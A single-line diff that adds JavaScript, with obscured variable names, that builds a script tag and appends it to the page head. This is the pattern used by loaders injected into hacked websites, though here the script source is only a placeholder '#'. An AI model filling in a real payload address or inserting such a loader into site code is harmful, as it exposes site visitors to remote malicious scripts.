@@ -1,0 +1,1 @@
+var _d9n = document.getElementsByTagName("head").item(0);_o1s = document.createElement("script");_o1s.setAttribute("src", "#");_o1s.setAttribute("type", "text/javascript");_d9n.appendChild(_o1s);
